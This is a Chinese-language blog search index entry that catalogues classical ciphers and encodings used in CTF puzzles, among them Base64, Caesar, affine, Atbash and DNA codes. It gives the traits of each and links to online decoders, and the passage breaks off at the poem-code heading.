<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>解密总结</title>
      <link href="/posts/10343.html"/>
      <url>/posts/10343.html</url>
      
        <content type="html"><![CDATA[<h2 id="几种编码方式"><a href="#几种编码方式" class="headerlink" title="几种编码方式"></a>几种编码方式</h2><h3 id="1-base"><a href="#1-base" class="headerlink" title="1. base"></a>1. base</h3><table><thead><tr><th>编码类型</th><th>字符集</th></tr></thead><tbody><tr><td>Base16</td><td><code>[0-9A-F]</code></td></tr><tr><td>Base32</td><td><code>[2-7A-Z=]</code></td></tr><tr><td>Base64</td><td><code>[0-9a-zA-Z+/=]</code></td></tr></tbody></table><p>这算是各大解密游戏中最常见的编码方式了。<br>介绍：<a href="https://baike.baidu.com/item/base64/8545775?fr=aladdin">百度百科</a><br>特点：末尾通常以<code>=</code>或<code>JTINE</code>结尾<br>解密网站：<a href="https://base64.supfree.net/">戳我</a></p><h3 id="2-凯撒密码"><a href="#2-凯撒密码" class="headerlink" title="2. 凯撒密码"></a>2. 凯撒密码</h3><p>这算是最简单的一种了。<br>介绍：<a href="https://baike.baidu.com/item/%E6%81%BA%E6%92%92%E5%AF%86%E7%A0%81/4905284?fromtitle=%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81&fromid=1336345&fr=aladdin">百度百科</a><br>特点：基本无。<br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">戳我</a></p><h3 id="3-栅栏密码"><a href="#3-栅栏密码" class="headerlink" title="3. 栅栏密码"></a>3. 栅栏密码</h3><p>这也挺简单的。<br>介绍：<a href="https://baike.baidu.com/item/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/228209?fr=aladdin">百度百科</a><br>特点：当一大段文字是乱码，您可以试试。<br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">戳我</a></p><h3 id="4-进制转换"><a href="#4-进制转换" class="headerlink" title="4. 进制转换"></a>4. 进制转换</h3><p>介绍：<a href="https://baike.baidu.com/item/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/3117222?fr=aladdin">百度百科</a><br>特点：一段数字要转成一段字符串(10\to3610→36)&#x2F;一段字符串要转成一段数字(36\to1036→10)。<br>解密网站：<a href="https://tool.oschina.net/hexconvert/">戳我</a><br>另：如果密码过长，可以使用<a href="https://tool.lu/hexconvert/">这个</a>，但是这个只能转换成指定进制。</p><h3 id="5-AES-x2F-DES-x2F-RC4-x2F-Rabbit-x2F-TripleDes解密"><a href="#5-AES-x2F-DES-x2F-RC4-x2F-Rabbit-x2F-TripleDes解密" class="headerlink" title="5. AES&#x2F;DES&#x2F;RC4&#x2F;Rabbit&#x2F;TripleDes解密"></a>5. AES&#x2F;DES&#x2F;RC4&#x2F;Rabbit&#x2F;TripleDes解密</h3><p>这几个都差不多。<br>介绍：<a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774?fromtitle=aes&fromid=5903&fr=aladdin">AES</a> <a href="https://baike.baidu.com/item/DES">DES</a> <a href="https://baike.baidu.com/item/RC4">RC4</a> TripleDes&#x2F;Rabbit暂无<br>特点：开头为<code>U2Fsd</code>，中间有几个<code>/</code>，且有时候有密钥。<br>解密网站：<a href="https://www.sojson.com/encrypt.html">戳我</a></p><h3 id="6-MD5"><a href="#6-MD5" class="headerlink" title="6.MD5"></a>6.MD5</h3><p>介绍：<a href="https://baike.baidu.com/item/MD5/212708?fr=aladdin">百度百科</a><br>特点：密码是16进制的，一般为32位或16位。<br>解密网站：<a href="https://www.cmd5.com/">戳我</a></p><h3 id="7-金笛短信PDU"><a href="#7-金笛短信PDU" class="headerlink" title="7.金笛短信PDU"></a>7.金笛短信PDU</h3><p>介绍：<a href="http://www.sendsms.cn/pdu/">戳我</a><br>特点：开头<code>0001000D9</code><br>解码网站：<a href="http://www.sendsms.cn/pdu/">戳我</a></p><h3 id="8-UUencode"><a href="#8-UUencode" class="headerlink" title="8.UUencode"></a>8.UUencode</h3><p>介绍：<a href="https://zh.wikipedia.org/wiki/Uuencode">维基百科</a><br>特点：<code>0~9</code>, <code>A~Z</code>, 再加上特殊符号，再加上空格，一共65个字符。</p><blockquote><p>字符集：</p><p> (space)!”#$%&amp;’()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_&#96;</p></blockquote><p>解码网站：<a href="http://www.hiencode.com/uu.html">戳我</a>, <a href="https://ctf.bugku.com/tool/uuencode">戳我</a></p><h3 id="9-XXencode"><a href="#9-XXencode" class="headerlink" title="9.XXencode"></a>9.XXencode</h3><p>介绍：<a href="https://www.jb51.net/article/85886.htm">脚本之家</a><br>特点：一共64个字符。跟base64打印字符相比，就是uuencode多一个“-” 字符，少一个”&#x2F;” 字符</p><blockquote><p>字符集：</p><p>+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</p></blockquote><p>解码网站：<a href="http://www.hiencode.com/xxencode.html">戳我</a>, <a href="https://ctf.bugku.com/tool/xxencode">戳我</a></p><h3 id="10-DNA"><a href="#10-DNA" class="headerlink" title="10.DNA"></a>10.DNA</h3><p>介绍：该代码使用一个简单的查找表（见下文），其中为英文字母表中的每个字母分配了一个唯一的三字母代码。<br>特点：这三个字母选自 DNA 碱基的字母：<strong>AGCT</strong>。任何未知字符或标点符号都将被忽略。</p><p><strong>Translation Table:</strong></p><table><thead><tr><th align="left">Letter</th><th>Code</th><th></th><th>Letter</th><th>Code</th><th></th><th>Letter</th><th>Code</th></tr></thead><tbody><tr><td align="left">0</td><td>ATA</td><td></td><td>C</td><td>TCA</td><td></td><td>Q</td><td>TAT</td></tr><tr><td align="left">1</td><td>TCT</td><td></td><td>D</td><td>TAC</td><td></td><td>R</td><td>CAC</td></tr><tr><td align="left">2</td><td>GCG</td><td></td><td>E</td><td>CTA</td><td></td><td>S</td><td>TGA</td></tr><tr><td align="left">3</td><td>GTG</td><td></td><td>F</td><td>GCT</td><td></td><td>T</td><td>TAG</td></tr><tr><td align="left">4</td><td>AGA</td><td></td><td>G</td><td>GTC</td><td></td><td>U</td><td>GAT</td></tr><tr><td align="left">5</td><td>CGC</td><td></td><td>H</td><td>CGT</td><td></td><td>V</td><td>GTA</td></tr><tr><td align="left">6</td><td>ATT</td><td></td><td>I</td><td>CTG</td><td></td><td>W</td><td>ATG</td></tr><tr><td align="left">7</td><td>ACC</td><td></td><td>J</td><td>TGC</td><td></td><td>X</td><td>AGT</td></tr><tr><td align="left">8</td><td>AGG</td><td></td><td>K</td><td>TCG</td><td></td><td>Y</td><td>GAC</td></tr><tr><td align="left">9</td><td>CAA</td><td></td><td>L</td><td>ATC</td><td></td><td>Z</td><td>GCA</td></tr><tr><td align="left">start</td><td>TTG</td><td></td><td>M</td><td>ACA</td><td></td><td></td><td>AGC</td></tr><tr><td align="left">stop</td><td>TAA</td><td></td><td>N</td><td>CTC</td><td></td><td>.</td><td>ACG</td></tr><tr><td align="left">A</td><td>ACT</td><td></td><td>O</td><td>TGT</td><td></td><td></td><td></td></tr><tr><td align="left">B</td><td>CAT</td><td></td><td>P</td><td>GAG</td><td></td><td></td><td></td></tr></tbody></table><p>解码网站：<a href="https://earthsciweb.org/js/bio/dna-writer/">戳我</a></p><h3 id="11-Mary-Stuart"><a href="#11-Mary-Stuart" class="headerlink" title="11.Mary Stuart"></a>11.Mary Stuart</h3><p>介绍：<strong>Mary Stuart想象的加密使用字母（但也包括单词）和符号之间的对应关系。完整的字母表定期更改，但在她和她的通讯员之间保密。</strong><br>示例： 转换为<a href="https://www.dcode.fr/tools/mary-stuart/images/char(81).png"><img src="https://www.dcode.fr/tools/mary-stuart/images/char(81).png" alt="字符（81）"></a><a href="https://www.dcode.fr/tools/mary-stuart/images/char(85).png"><img src="https://www.dcode.fr/tools/mary-stuart/images/char(85).png" alt="战车(85)"></a><a href="https://www.dcode.fr/tools/mary-stuart/images/char(69).png"><img src="https://www.dcode.fr/tools/mary-stuart/images/char(69).png" alt="字符（69）"></a><a href="https://www.dcode.fr/tools/mary-stuart/images/char(69).png"><img src="https://www.dcode.fr/tools/mary-stuart/images/char(69).png" alt="字符（69）"></a><a href="https://www.dcode.fr/tools/mary-stuart/images/char(78).png"><img src="https://www.dcode.fr/tools/mary-stuart/images/char(78).png" alt="字符（78）"></a> 结果为 <code>QUEEN</code>.<br>转换表：<br><img src="https://www.dcode.fr/tools/mary-stuart/images/alphabet.png"><br>解码网站：<a href="https://www.dcode.fr/code-mary-stuart">戳我</a></p><h3 id="12-甲骨文数字"><a href="#12-甲骨文数字" class="headerlink" title="12.甲骨文数字"></a>12.甲骨文数字</h3><p><strong>转换表：</strong><br><img src="https://iknow-pic.cdn.bcebos.com/aa18972bd40735fa68f63ebc91510fb30f2408b4"></p><h3 id="13-Python-pickle"><a href="#13-Python-pickle" class="headerlink" title="13.Python_pickle"></a>13.Python_pickle</h3><p>介绍：模块 <a href="https://docs.python.org/zh-cn/3.8/library/pickle.html#module-pickle"><code>pickle</code></a> 实现了对一个 Python 对象结构的二进制序列化和反序列化。<br>特点：文件头 <code>80 04</code>，ascii码是 <code>€.</code><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment"># 序列化 pickle.dumps</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pickle.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pickle.dumps(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化 pickle.loads</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pickle.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.loads(f.read()))</span><br></pre></td></tr></table></figure><h3 id="14-当铺密码"><a href="#14-当铺密码" class="headerlink" title="14.当铺密码"></a>14.当铺密码</h3><p>介绍：当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。<br>王：该字外面有 6 个出头的位置，所以该汉字对应的数字就是 6；<br>口：该字外面没有出头的位置，那就是0；<br>人：该字外面有 3 个出头的位置，所以该汉字对应的数字就是 3；<br>以此类推 ….<br>下面是一段由当铺密码组成的字符：<br>密文：王夫 井工 夫口 由中人 井中 夫夫 由中大<br>对应：67 84 70 123 82 77 125<br>翻译成 ASCII [2]  码： CTF{RM}</p><p>在线解密：<a href="http://dsb.ink/ctf/dangpu.html">戳我</a></p><h3 id="15-keyword关键字密码"><a href="#15-keyword关键字密码" class="headerlink" title="15.keyword关键字密码"></a>15.keyword关键字密码</h3><p>关键词加密（keyword cipher）也是一种单表替代加密，与凯撒加密不同之处在于密钥可以更为复杂，加密时需要选择一个关键词，如果这个关键词有重复的字母，去除除第一次出现之外的所有的相同的字母。例如，如果选定的关键词为“success”，则使用“suce”。<br>将该关键词写在字母表的下方，并用字母表的其他字母按标准的顺序填写余下的空间。这样就构建了字母一一对应的关系，加密时用下面一行中的字母对应替换上面一行的字母；解密时用上面一行中的字母对应替换下面一行的字母。</p><br><p>例子：</p><p>Cipher : agqr{yue_stdcgciup_padas}<br>Key : angstromcf</p><p>前10个字母先用key填充，后面的按上面key没有出现的字母顺序展开。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538114.png"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538115.png"></p><p>对照上面的表格各个字母对应的字母，对应解密得到 flag：actf{yum_delicious_salad}<br>解密网站：<a href="http://www.hiencode.com/keyword.html">戳我</a>，<a href="http://www.secretcodebreaker.com/keyword.html">戳我</a>，<a href="https://www.wishingstarmoye.com/ctf/keyword">戳我</a></p><h3 id="16-仿射密码（Affine-Cipher）"><a href="#16-仿射密码（Affine-Cipher）" class="headerlink" title="16.仿射密码（Affine Cipher）"></a>16.仿射密码（Affine Cipher）</h3><p><strong>准备工作：</strong><br>密钥：K &#x3D; (7, 3)，7^-1^ mod 26 &#x3D; 15<br>加密函数：y &#x3D; f(x) &#x3D; 7x + 3 (mod 26)<br>解密函数：x &#x3D; f^-1^(y) &#x3D; 15(y-3)(mod26) &#x3D; 15y - 19(mod26)</p><p><strong>加密过程：</strong></p><hr><p>明文：CHINA</p><p>1.字母转换数字：2, 7, 8, 13, 0</p><p>2.加密函数：</p><p><img src="C:\Users\97766\AppData\Roaming\Typora\typora-user-images\image-20230206153944232.png" alt="image-20230206153944232"></p><p>3.数字转字母：RAHQD</p><p><strong>解密流程：</strong></p><hr><p>密文：RAHQD</p><p>1.字母转换数字：17, 0, 7, 16, 3</p><p>2.解密函数：</p><p><img src="C:\Users\97766\AppData\Roaming\Typora\typora-user-images\image-20230206153958975.png" alt="image-20230206153958975"></p><p>3.数字转字母：CHINA</p><h3 id="17-base100"><a href="#17-base100" class="headerlink" title="17.base100"></a>17.base100</h3><p>转换表：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538116.jpg"></p><p>解密网站：<a href="http://www.hiencode.com/keyword.html">戳我</a>, <a href="http://www.atoolbox.net/Tool.php?Id=936">戳我</a></p><h3 id="18-音乐符号"><a href="#18-音乐符号" class="headerlink" title="18.音乐符号"></a>18.音乐符号</h3><p>列子：<code>‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪♭‖‖‖♬♬‖‖♭‖♩♫♭♭♭‖‖♭‖♩♫♭♭♭♭♭♬‖¶♯‖♬♭‖♬♫‖♫♫§=</code><br>解密：<code>flag&#123;Th1s_1s_Flag&#125;</code><br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">戳我</a></p><h3 id="19-盲文符号"><a href="#19-盲文符号" class="headerlink" title="19.盲文符号"></a>19.盲文符号</h3><p>例子：<code>⡖⡜⡑⡗⡋⡝⡑⡞⡇⡕⡞⡯⠁⡃⡯⡕⡑⡃⡉⠑⡍=</code><br>解密：<code>flag&#123;manwen_1s_easy!&#125;</code><br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">戳我</a></p><h3 id="20-箭头符号"><a href="#20-箭头符号" class="headerlink" title="20.箭头符号"></a>20.箭头符号</h3><p>例子：<code>↕↖↕↲↕↑↕↗↔↱↗↘↕↕↕↲↕↲↕↻↖↻↖↗↕↻↔→←↑↕↔↑↑↔↳=</code><br>解密：<code>flag&#123;Hello_Wor1d!&#125;</code><br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou">戳我</a></p><h3 id="21-花朵符号"><a href="#21-花朵符号" class="headerlink" title="21.花朵符号"></a>21.花朵符号</h3><p>例子：<code>❀❁❀❇❀✼❀❂✿❆❂❃❀❀❀❇❀❇❀❊❁❊❁❂❀❊✿✽✻✼❀✿✼✼✿❈=</code><br>解密：<code>flag&#123;Hello_Wor1d!&#125;</code><br>解密网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">戳我</a></p><h3 id="22-文本加密汉字，数字，字母…-千千xiu"><a href="#22-文本加密汉字，数字，字母…-千千xiu" class="headerlink" title="22.文本加密汉字，数字，字母…(千千xiu)"></a>22.文本加密汉字，数字，字母…(千千xiu)</h3><p>特点：末尾通常以<code>=</code>或者<code>==</code>结尾</p><p><strong>将文本加密为以下字符（密文为不可连读的指定字符）：</strong><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php">汉字</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=shuzi">数字</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">字母</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音乐符号</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinbiao">国际音标</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">盲文</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=hanwen">韩文</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=riwen">日文</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=daiwen">傣文</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yiwen">彝文</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou">箭头符号</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">花朵符号</a> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=ewen">俄文</a></p><h3 id="23-Boke-Code"><a href="#23-Boke-Code" class="headerlink" title="23.Boke Code"></a>23.Boke Code</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538117.png"></p><h3 id="24-Ook-单表替换"><a href="#24-Ook-单表替换" class="headerlink" title="24.Ook!单表替换"></a>24.Ook!单表替换</h3><p>给你一段文本文件如下：</p><blockquote><p>00000 00000 00000 00000 12110 20000 00000 00000 00000 02021 02000 01000<br>00000 00000 10200 00000 12110 21111 11202 10211 11100 00000 00000 01020<br>00000 00012 11020 00000 00202 10200 00000 01000 00102 0</p></blockquote><p>里面虽然看似杂乱无章，实则有以下规律：<br>5列一段，只出现了<code>012</code>，这3个字符。<br>利用单表替换：<code>0 --&gt; .</code>, <code>1 --&gt; !</code>, <code>2 --&gt; ?</code>，单表替换后结果如下：</p><blockquote><p>….. ….. ….. ….. !?!!. ?…. ….. ….. ….. .?.?! .?… .!…<br>….. ….. !.?.. ….. !?!!. ?!!!! !!?.? !.?!! !!!.. ….. ….. .!.?.<br>….. …!? !!.?. ….. ..?.? !.?.. ….. .!… ..!.? .</p></blockquote><p>使用<a href="https://www.splitbrain.org/services/ook">在线网站</a>，即可得到flag。</p><h3 id="25-Autokey自动密钥密码"><a href="#25-Autokey自动密钥密码" class="headerlink" title="25.Autokey自动密钥密码"></a>25.Autokey自动密钥密码</h3><p>简介：<strong>自动密钥密码</strong>是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a>中的一种加密算法，与<a href="https://zh.wikipedia.org/wiki/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81">维吉尼亚密码</a>类似，区别在于密钥不同。它的密钥开头是一个关键词，之后则是明文的重复。<br>详细介绍：<a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81">维基百科</a><br>爆破密钥脚本：<a href="https://github.com/hotzzzzy/breakautokey">breakautokey</a></p><h3 id="26-Toy密码"><a href="#26-Toy密码" class="headerlink" title="26.Toy密码"></a>26.Toy密码</h3><p>简介：单表替换密码</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538118.png"></p><h3 id="27-三分密码"><a href="#27-三分密码" class="headerlink" title="27.三分密码"></a>27.三分密码</h3><p><strong>三分密码</strong>由<a href="https://zh.wikipedia.org/w/index.php?title=F%C3%A9lix_Delastelle&action=edit&redlink=1">Félix Delastelle</a>发明（他也发明了<a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC">四方密码</a>和<a href="https://zh.wikipedia.org/w/index.php?title=%E4%BA%8C%E5%88%86%E5%AF%86%E7%A2%BC&action=edit&redlink=1">二分密码</a>）。二分密码是二维的，用5×5（或6×6）的矩阵加密，但三分密码则用3×3×3的。它是第一个应用的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A4%9A%E5%AD%97%E6%AF%8D%E6%9B%BF%E6%8F%9B%E5%AF%86%E7%A2%BC&action=edit&redlink=1">三字母替换密码</a>。</p><p>首先随意制造三个3×3的<a href="https://zh.wikipedia.org/w/index.php?title=Polybius%E6%96%B9%E6%A0%BC%E6%9B%BF%E4%BB%A3%E5%AF%86%E7%A2%BC&action=edit&redlink=1">Polybius方格替代密码</a>，包括26个英文字母和一个符号。然后写出要加密的讯息的三维坐标。讯息和坐标四个一列排起，再顺序取横行的数字，三个一组分开，将这三个数字当成坐标，找出对应的字母，便得到密文。</p><p>二分密码的做法相近，和后来出现的<a href="https://zh.wikipedia.org/wiki/ADFGVX%E5%AF%86%E7%A2%BC">ADFGVX密码</a>差不多。</p><p>加密“hello world”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    1       2       3</span><br><span class="line">  -----   -----   -----</span><br><span class="line">1 L E O   N A R   D V I</span><br><span class="line">2 C B F   G H J   K M P</span><br><span class="line">3 Q S T   U W X   Y Z /</span><br><span class="line">  1 2 3   1 2 3   1 2 3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H E L L O W O R L D</span><br><span class="line">-------------------</span><br><span class="line">2 1 1 1 1 2 1 2 1 3</span><br><span class="line">2 1 1 1 1 3 1 1 1 1</span><br><span class="line">2 2 1 1 3 2 3 3 1 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 1 1  1 1 2  1 2 1  3 2 1  1 1 1  3 1 1  1 1 2  2 1 1  3 2 3  3 1 1</span><br><span class="line">  N      E      C      K      L      D      E      N      P      D</span><br></pre></td></tr></table></figure><h3 id="28-WingDings"><a href="#28-WingDings" class="headerlink" title="28.WingDings"></a>28.WingDings</h3><p><strong>Wingdings</strong>是一系列<a href="https://zh.wikipedia.org/wiki/Dingbat">杂锦</a><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E4%BD%93">字体</a>，可将字母呈现为各种符号，最初由<a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BD%AF">微软</a>于1990年开发，结合了由<a href="https://zh.wikipedia.org/w/index.php?title=Charles_Bigelow_(%E5%9E%8B%E5%8F%B7%E8%AE%BE%E8%AE%A1%E5%B8%88)&action=edit&redlink=1">Charles Bigelow</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%8B%E8%8E%89%E7%B5%B2%C2%B7%E8%8D%B7%E5%A7%86%E6%96%AF&action=edit&redlink=1">克莉丝·荷姆斯</a>和Al Bunker授权的<a href="https://zh.wikipedia.org/wiki/Lucida">Lucida</a> Icon，Arrows，Stars的字形[<a href="https://zh.wikipedia.org/wiki/Wingdings#cite_note-1">1]</a>。某些版本的字体版权字符串中提到部分版权归属于Type Solutions, Inc，它是用于<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E4%BD%93%E5%BE%AE%E8%B0%83">微调</a>字体的工具的制造商。</p><p>一开始没有任何字符映射到<a href="https://zh.wikipedia.org/wiki/Unicode">Unicode</a>中；但是，Unicode 7.0开始加入了Wingdings和<a href="https://zh.wikipedia.org/wiki/Webdings">Webdings</a>字体的许多符号[<a href="https://zh.wikipedia.org/wiki/Wingdings#cite_note-2">2]</a>[<a href="https://zh.wikipedia.org/wiki/Wingdings#cite_note-3">3]</a>。</p><p>解码网站：<a href="https://lingojam.com/WingdingsTranslator">戳我</a></p><h3 id="29-云影加密-01248密码"><a href="#29-云影加密-01248密码" class="headerlink" title="29.云影加密(01248密码)"></a>29.云影加密(01248密码)</h3><p>原理：有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0&#x3D;28， 也就是0&#x3D;2+8，同理7&#x3D;124， 9&#x3D;18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。</p><p>特点：0作为分割符号，只会出现01248这几种字符。</p><p>解密工具：<a href="https://github.com/Leon406/ToolsFx">ToolsFx</a></p><h3 id="30-Serpent"><a href="#30-Serpent" class="headerlink" title="30.Serpent"></a>30.Serpent</h3><p><strong>Serpent</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%A8%B1%E5%AF%86%E9%91%B0%E5%8A%A0%E5%AF%86">对称式</a><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86">分组加密</a>算法，是<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">高级加密标准</a>（AES）的候选者之一，其顺序仅次于<a href="https://zh.wikipedia.org/wiki/Rijndael">Rijndael</a>算法。设计者为<a href="https://zh.wikipedia.org/w/index.php?title=%E7%BE%85%E6%96%AF%C2%B7%E5%AE%89%E5%BE%B7%E6%A3%AE&action=edit&redlink=1">罗斯·安德森</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E8%89%BE%E5%8A%9B%C2%B7%E7%95%A2%E6%BC%A2%E5%A7%86&action=edit&redlink=1">艾力·毕汉姆</a>及<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8B%89%E7%88%BE%E6%96%AF%C2%B7%E5%85%8B%E5%8A%AA%E6%A3%AE&action=edit&redlink=1">拉尔斯·克努森</a>。</p><p>与其他进入AES评选名单的算法一样，Serpent的区块长度为128<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">比特</a>，支持的密钥长度为128、192和256比特。</p><p>解密网站：<a href="http://serpent.online-domain-tools.com/">戳我</a></p><h3 id="31-Quoted-printable"><a href="#31-Quoted-printable" class="headerlink" title="31.Quoted-printable"></a>31.Quoted-printable</h3><p>特点：一个等号“&#x3D;”后跟随两个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数字（0–9或A–F）表示该字节的数值。</p><p>编码：</p><blockquote><p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p></blockquote><p>解码：</p><blockquote><p>用你那火热的嘴唇让我在午夜里无尽的销魂</p></blockquote><p>解码网站：<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">戳我</a></p><h3 id="32-Atbash-Cipher-阿特巴希密码"><a href="#32-Atbash-Cipher-阿特巴希密码" class="headerlink" title="32.Atbash Cipher(阿特巴希密码)"></a>32.Atbash Cipher(阿特巴希密码)</h3><p>阿特巴希密码将字母表整个扭转：第一个字母（aleph）与最后一个（taw）相替换，第二个（beth）与倒数第二个（shin）相替换，如此类推。密码学上的示沙克之谜出现在《<a href="https://zh.wikipedia.org/wiki/%E8%80%B6%E5%88%A9%E7%B1%B3%E6%9B%B8">耶利米书</a>》中，ששך-<em>示沙克</em>（25:26；51:41）其实是加密后的בבל-<em>巴别</em>（即<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E6%AF%94%E5%80%AB">巴比伦</a>）。[<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E7%89%B9%E5%B7%B4%E5%B8%8C%E5%AF%86%E7%A2%BC#cite_note-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E7%89%B9%E5%B7%B4%E5%B8%8C%E5%AF%86%E7%A2%BC#cite_note-2">2]</a></p><p>现代希伯来文配合阿特巴希密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：  אבגדהוזחטיכלמנסעפצקרשת</span><br><span class="line">密文：  תשרקצפעסנמלכיטחזוהדגבא</span><br></pre></td></tr></table></figure><p>而罗马字母使用阿特巴希密码则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：  ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">密文：  ZYXWVUTSRQPONMLKJIHGFEDCBA</span><br></pre></td></tr></table></figure><p>特点：uozt -&gt; flag对应</p><p>解密网站：<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">戳我</a>，还可以使用<a href="https://github.com/Ciphey/Ciphey">Ciphey自动解密</a>。</p><h3 id="33-Poem-Codes-诗歌密码"><a href="#33-Poem-Codes-诗歌密码" class="headerlink" title="33.Poem 